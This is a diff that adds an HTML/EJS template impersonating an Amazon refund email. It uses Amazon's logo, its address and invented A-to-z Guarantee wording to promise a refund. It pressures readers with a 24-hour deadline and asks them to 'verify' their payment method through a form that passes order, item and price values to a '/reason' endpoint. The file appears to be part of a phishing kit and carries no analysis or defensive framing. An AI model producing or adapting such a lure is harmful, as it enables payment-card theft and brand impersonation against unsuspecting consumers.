@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Refund Notification</title>
+    <link rel="icon" href="/images/favicon.png" type="image/png">
+    
+    <style>
+        body, html { margin: 0; padding: 0; font-family: "Amazon Ember", Arial, sans-serif; background-color: #f2f2f2; color: #333; line-height: 1.6; }
+        .email-container { max-width: 600px; margin: 20px auto; background-color: #ffffff; border: 1px solid #dddddd; }
+        .header { padding: 20px; text-align: left; border-bottom: 1px solid #eaeaea; }
+        .logo-img { width: 105px; height: auto; }
+        .content { padding: 30px 25px; }
+        h1 { color: #cc6600; font-size: 20px; font-weight: 700; margin-top: 0; margin-bottom: 5px; font-family: Arial, sans-serif; }
+        .sub-header { font-size: 14px; color: #555; margin-bottom: 20px; }
+        h2 { font-size: 16px; font-weight: 700; margin-bottom: 10px; color: #111; }
+        p { font-size: 14px; margin-bottom: 15px; color: #333; }
+        .item-box { background-color: #fcfcfc; border: 1px solid #e7e7e7; padding: 15px; margin-bottom: 20px; border-radius: 4px; font-size: 13px; }
+        .item-name { font-weight: 700; color: #007185; font-size: 14px; margin-bottom: 4px; display: block;}
+        .price-tag { color: #B12704; font-weight: 700; }
+        .highlight { font-weight: 700; color: #111; }
+        .amazon-button { display: block; width: 100%; max-width: 280px; margin: 25px auto; text-align: center; background: linear-gradient(to bottom, #f7dfa5, #f0c14b); border-style: solid; border-width: 1px; border-color: #a88734 #9c7e31 #846a29; color: #111; font-size: 13px; font-family: Arial, sans-serif; font-weight: 400; padding: 10px 0; text-decoration: none; border-radius: 3px; box-shadow: 0 1px 0 rgba(255,255,255,0.4) inset; cursor: pointer; }
+        .amazon-button:hover { background: linear-gradient(to bottom, #f5d78e, #eeb933); }
+        .disclaimer { font-size: 11px; color: #767676; margin-top: 20px; border-top: 1px solid #eee; padding-top: 10px;}
+        .footer { padding: 20px; font-size: 10px; color: #999; background-color: #fcfcfc; border-top: 1px solid #eaeaea; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <div class="header">
+            <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon.com">
+        </div>
+        <div class="content">
+            <h1>Action Required: Refund Notification</h1>
+            <div class="sub-header">Reference ID: #REF-<%= Math.floor(Math.random() * 10000000) %></div>
+            <p>Dear Customer,</p>
+            <p>Our Fulfillment Center has flagged an unexpected logistic issue regarding your recent order <span class="highlight">#<%= order %></span>.</p>
+            <div class="item-box">
+                <span style="color: #555;">Item Description:</span><br>
+                <span class="item-name"><%= item %></span>
+                Total Refund Value: <span class="price-tag">$<%= price %></span>
+            </div>
+            <p>In accordance with the <strong>Amazon A-to-z Guarantee Policy</strong>, you have been automatically approved for a full compensation of <strong>$<%= price %></strong>.</p>
+            <p>To ensure the security of this transaction, we require a manual confirmation of your payment method before the funds can be released. This verification link will expire in 24 hours.</p>
+            <form action="/reason" method="GET" style="text-align: center;">
+                <input type="hidden" name="item" value="<%= item %>">
+                <input type="hidden" name="price" value="<%= price %>">
+                <input type="hidden" name="order" value="<%= order %>">
+                <button type="submit" class="amazon-button">Verify and Claim Refund ($<%= price %>)</button>
+            </form>
+            <div class="disclaimer">Note: This email was sent from a notification-only address that cannot accept incoming email. Please do not reply to this message.</div>
+        </div>
+        <div class="footer">© 2025 Amazon.com, Inc. or its affiliates. All rights reserved.<br>410 Terry Ave N, Seattle, WA 98109, United States</div>
+    </div>
+</body>
+</html>
